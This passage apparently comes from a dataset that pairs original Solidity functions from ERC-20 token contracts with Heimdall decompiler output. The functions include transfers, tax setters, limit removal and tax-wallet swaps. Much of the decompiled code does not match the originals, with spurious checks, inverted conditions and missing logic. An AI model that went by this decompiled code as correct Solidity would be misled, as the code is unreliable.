0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x912Abb1B9600d25937CAb8797A3CD5235bf2aAd5", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual returns (bool) {\\n        balanceOf[msg.sender] -= amount;\\n\\n        // Cannot overflow because the sum of all user\\n        // balances can't exceed the max uint256 value.\\n        unchecked {\\n            balanceOf[to] += amount;\\n        }\\n\\n        emit Transfer(msg.sender, to, amount);\\n\\n        return true;\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(0x02 == is_trading_enabled);\n        require(0x02 == is_trading_enabled);\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        require(tx.origin == (address(owner)));\n        address var_a = address(msg.sender);\n        var_b = 0x0f;\n        require(!bytes1(storage_map_b[var_a]));\n        var_a = address(arg0);\n        var_b = 0x10;\n        require(bytes1(storage_map_b[var_a]));\n        require(bytes1(storage_map_b[var_a]));\n        var_a = address(arg0);\n        var_b = 0x0f;\n        require(!bytes1(storage_map_b[var_a]));\n        require(address(this) == (address(msg.sender)));\n        var_a = address(msg.sender);\n        var_b = 0x12;\n        require(bytes1(storage_map_b[var_a]));\n        var_a = address(this);\n        var_b = 0x03;\n        require(!0x01 == in_swap);\n        require(!0);\n        require(!storage_map_b[var_a] > sell_tax_threshold);\n        in_swap = 0x02;\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_h = address(weth);\n        var_i = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_j = storage_map_b[var_a];\n        uint256 var_k = 0;\n        var_l = 0xa0;\n        uint256 var_m = var_d.length;\n        address var_n = address(tax_receiver);\n        var_o = 0x056bc75e2d630fffff;\n        require(address(uni_router).code.length);\n        (bool success, bytes memory ret0) = address(uni_router).{ value: var_k ether }Unresolved_791ac947(var_j); // call\n        in_swap = 0x01;\n        require(!0, \"max tx limit\");\n        var_a = address(this);\n        var_b = 0x03;\n        require(!(storage_map_b[var_a] > (0 + storage_map_b[var_a])), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(!((0 + storage_map_b[var_a]) < storage_map_b[var_a]), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x01;\n        var_a = address(this);\n        var_b = 0x03;\n        storage_map_b[var_a] = var_k + storage_map_b[var_a];\n        uint256 var_i = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        var_a = address(msg.sender);\n        var_b = 0x03;\n        require(!(arg1 > storage_map_b[var_a]), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x01;\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x03;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        require(!(0 > arg1), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x01;\n        require(!((arg1 - 0) > arg1), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_a = address(msg.sender);\n        var_b = 0x11;\n        require(bytes1(storage_map_b[var_a]), \"max tx limit\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_j = 0x20;\n        var_k = 0x0c;\n        var_l = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_j = 0x20;\n        var_k = 0x0c;\n        var_l = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_a = address(msg.sender);\n        var_b = 0x11;\n        require(bytes1(storage_map_b[var_a]), \"max tx limit\");\n        require(0 - arg1, \"max tx limit\");\n        require((sell_tax == ((sell_tax * arg1) / arg1)) | !arg1, \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(arg1, \"max tx limit\");\n        require(((sell_tax * arg1) / arg1) == sell_tax, \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x01;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x0c;\n        var_r = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x0c;\n        var_r = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        if (address(this) == (address(msg.sender))) {\n        }\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_a = address(arg0);\n        var_b = 0x11;\n        require(bytes1(storage_map_b[var_a]), \"max tx limit\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x0c;\n        var_r = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x0c;\n        var_r = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        if (!storage_map_b[var_a]) {\n            if (!storage_map_b[var_a]) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x29;\n        var_r = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_j = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x23;\n        var_r = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x25;\n        var_r = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_j = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x11;\n        var_r = 0x74726164696e672069736e74206c697665000000000000000000000000000000;\n        require(tx.origin == (address(owner)), \"trading isnt live\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x11;\n        var_r = 0x74726164696e672069736e74206c697665000000000000000000000000000000;\n    }"}
{"contract_address": "0xaCb8531Fb60d23846f82b8911F28b44D83e2554d", "original_solidity_code": "function setfinalbuytax(uint256 finalbuytax) external onlyOwner() {\r\n        _finalBuyTax = finalbuytax;\r\n        require(_finalBuyTax<=30, \"less than 30%\");\r\n    }", "heimdall_decompiled_code": "function setfinalbuytax(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _finalBuyTax = arg0;\n        require(!(arg0 > 0x1e), \"less than 30%\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0d;\n        var_d = 0x6c657373207468616e2033302500000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xa515dE84372C195F39fa6993AE9f7955EFFd8d1c", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        _reduceSellTaxAt=20;\r\n        _reduceBuyTaxAt=20;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x08) {\n            if ((0x01 == 0x01) | !0x0e69870b00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x0e69870b00;\n                if (0x08) {\n                    if ((0x01 == 0x01) | !0x0e69870b00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x0e69870b00;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        _reduceSellTaxAt = 0x14;\n                        _reduceBuyTaxAt = 0x14;\n                        if (0x08) {\n                            if ((0x01 == 0x01) | !0x0e69870b00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x0e69870b00;\n                                emit MaxTxAmountUpdated(0x0e69870b00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                    if (!0x08 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x54eEA875389f51FB46A26Ea5a5DbBa480ca74339", "original_solidity_code": "function transfer(address to, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        require(0 - arg1, \"ERC20: transfer amount exceeds balance\");\n        require(address(owner) == (address(msg.sender)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(owner)) == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(this);\n        uint256 var_b = 0;\n        require(storage_map_b[var_a] < swapTokensAtAmount, \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x1a;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x1c;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require((sellTotalFees == ((sellTotalFees * arg1) / arg1)) | !arg1, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_a = address(msg.sender);\n        var_b = 0x1c;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(buyTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(this), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_b[var_a] < 0), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - 0;\n        var_a = address(this);\n        storage_map_b[var_a] = var_b + storage_map_b[var_a];\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(uniswapV2Pair / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer from the zero address\");\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x1c;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer from the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x1c;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(buyTotalFees > 0), \"ERC20: transfer from the zero address\");\n        require(!0, \"ERC20: transfer from the zero address\");\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        uniswapV2Pair = 0x010000000000000000000000000000000000000000 | (uint248(uniswapV2Pair));\n        var_a = address(this);\n        var_b = 0;\n        if (!store_u > (store_v + store_u)) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (!tradingActive / 0x0100) {\n                if (!tradingActive / 0x0100) {\n                    if (!tradingActive / 0x0100) {\n                        if (!tradingActive / 0x0100) {\n                            if (!tradingActive / 0x0100) {\n                            }\n                        }\n                    }\n                }\n            }\n            require(!(store_u > (store_v + store_u)), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x1c;\n            require(bytes1(tradingActive), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1b;\n            require(!(bytes1(storage_map_b[var_a])), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1c;\n            require(!(!bytes1(storage_map_b[var_a])), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x1b;\n            require(!(bytes1(storage_map_b[var_a])), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1b;\n            require(!(!bytes1(storage_map_b[var_a])), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n        }\n        require(!(arg1 > maxTransactionAmount), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x3d;\n        var_g = 0x45524332303a2053656c6c207472616e7366657220616d6f756e742065786365;\n        var_h = 0x65647320746865206d61785472616e73616374696f6e416d6f756e742e000000;\n        if (!storage_map_b[var_a]) {\n        }\n        require(!(arg1 > maxTransactionAmount), \"ERC20: Buy transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x3c;\n        var_g = 0x45524332303a20427579207472616e7366657220616d6f756e74206578636565;\n        var_h = 0x647320746865206d61785472616e73616374696f6e416d6f756e742e00000000;\n        if (!storage_map_b[var_a]) {\n        }\n        var_a = address(msg.sender);\n        var_b = 0x1a;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: Trading is not active.\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: Trading is not active.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x1d;\n        var_g = 0x45524332303a2054726164696e67206973206e6f74206163746976652e000000;\n        if (!address(arg0)) {\n            if (!address(arg0)) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x10A7A2212f6b6ffE22d339D8Aa6e89a17ad8b1ad", "original_solidity_code": "function removeLimits() external onlyOwner returns (bool) {\n        limitsInEffect = false;\n        return true;\n    }", "heimdall_decompiled_code": "function removeLimits() public returns (bool) {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        tradingActive = (0 * 0x01) | (uint248(tradingActive));\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x45c86eBa585dfA8C43E636EBd025C99E972aB464", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x7006A0F5D09b07a365Ff1306467407E57312cF29", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_h[var_a] > 0);\n        store_g = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_g));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x41;\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_f = address(this);\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i == (address(var_i)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_j = address(var_i);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_f / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_f / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = storage_map_h[var_a];\n        address var_k = storage_map_h[var_a];\n        emit Approval(address(this), address(store_f / 0x01), storage_map_h[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_l = storage_map_h[var_a];\n        uint256 var_m = 0;\n        uint256 var_n = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_p = var_e.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_f / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_f / 0x01).Unresolved_791ac947(var_l); // call\n        store_g = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_g));\n        require(!address(this).balance > 0);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x780c7f2FdF0D47F25f5858975DBd0159DB50C1B2", "original_solidity_code": "function updateSliverEconomicCapSummits(uint256 newNum) external onlyOwner {\\r\\n        require(\\r\\n            newNum >= ((totalSupply() * 10) / 1000) / 1e9,\\r\\n            \\\"Cannot set maxHoldings lower than 1.0%\\\"\\r\\n        );\\r\\n        maxHoldings = newNum * (10**9);\\r\\n    }", "heimdall_decompiled_code": "function updateSliverEconomicCapSummits(uint256 arg0) public view {\n        require(arg0 == arg0);\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!totalSupply | (0x0a == ((totalSupply * 0x0a) / totalSupply)));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x03e8);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n    }"}
{"contract_address": "0x4a4571840601e53dC0f99F0b58AdCC14B601e418", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function getTotalMinted() public view returns (uint256) {\\r\\n        require(guaranteedWhitelistInfo.CURR_MINTED +\\r\\n                competitveWhitelistInfo.CURR_MINTED +\\r\\n                publicInfo.CURR_MINTED == totalSupply(), \\\"Incorrect sum of minted tokens\\\");\\r\\n        return totalSupply();\\r\\n    }", "heimdall_decompiled_code": "function getTotalMinted() public view {\n        if (!getGuaranteedWhitelistNumMinted > ~(getCompetitiveWhitelistNumMinted)) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n        }\n    }"}
{"contract_address": "0xF4DEF1F694801EaBF6f4B4b8b0209E617Bb224e8", "original_solidity_code": "function manualsend() external {\r\n        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);\r\n        uint256 contractETHBalance = address(this).balance;\r\n        sendETHToFee(contractETHBalance);\r\n    }", "heimdall_decompiled_code": "function manualsend() public {\n        require(address(msg.sender) == (address(store_p)));\n        require(address(msg.sender) == (address(store_q)));\n        (bool success, bytes memory ret0) = address(store_q).transfer(address(this).balance);\n    }"}
{"contract_address": "0x49e5FEE649E311efc2Cfb0f1f47e82CD90bECA13", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0x9cE4E67bFC441B766d43D1C2C8929A281E35A294", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
